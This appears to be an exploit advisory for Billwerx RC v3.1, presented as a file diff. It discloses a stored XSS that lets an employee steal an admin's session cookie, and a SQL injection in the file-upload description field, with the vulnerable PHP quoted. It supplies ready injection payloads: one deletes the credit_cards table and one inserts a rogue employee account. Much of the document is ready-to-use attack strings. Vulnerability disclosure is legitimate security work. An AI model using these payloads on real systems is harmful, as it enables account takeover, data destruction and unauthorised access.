@@ -1,0 +1,139 @@
+#################################################################
+
+#
+
+# Billwerx RC v3.1 Multiple Vulnerabilities
+
+# Found By: mr_me
+
+# Download: http://www.billwerx.com/download.php
+
+# Tested On: Windows Vista
+
+# Note: For educational purposes only
+
+#
+
+#################################################################
+
+
+
+XSS POC:
+
+
+
+A regular employee can embed javascript code that could be executed within the context of the admin's browser.
+
+If the user edits their own profile by going to "http://[server]/billwerx_public_beta/employees/update_employee.php?employee_id=2" 
+
+and places "<script>alert(document.cookie)</script>" 
+
+into any of the following fields: 'firstname', 'billing address', 'billing city', 'billing province', 'billing postal', 'billing country' and then gives the following link to the admin:
+
+
+
+http://[server]/billwerx_public_beta/employees/update_employee.php?employee_id=2
+
+
+
+The user could potentially log the admins cookie and reset their own session thus gaining administration access.
+
+
+
+SQL Injection POC:
+
+
+
+http://127.0.0.1/billwerx_public_beta/employees/company_files.php
+
+
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1')' at line 1
+
+
+
+Here you can see in the code snip that the description post value is unsanitized. 
+
+
+
+8<-------------snip-------------8<
+
+
+
+$description = strtolower($_POST['description']);
+
+
+
+$employee_id = $_SESSION['employee_id'];
+
+
+
+$readfile = fopen($temp_name, 'r');
+
+$content = fread($readfile, filesize($temp_name));
+
+$content = addslashes($content);
+
+fclose($readfile);
+
+
+
+# Assign values to a database table:
+
+$doSQL = "INSERT INTO company_files (name, size, type, content, public, description, employee_id) VALUES ('$name', '$size', '$type', '$content', '$public', '$description', '$employee_id')";
+
+
+
+8<-------------snip-------------8<
+
+
+
+SQL Injection exploit:
+
+
+
+','1'); DELETE FROM credit_cards;/*
+
+
+
+or
+
+
+
+','1'); insert into employees values (4, 'mr_me', 'hello', '', '', '', '', '', 'mr_me@hax0r.com', 'lol_mypassword', 0.00, 3, '', '', '', '', '', '2009-07-28 10:47:59');/*
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
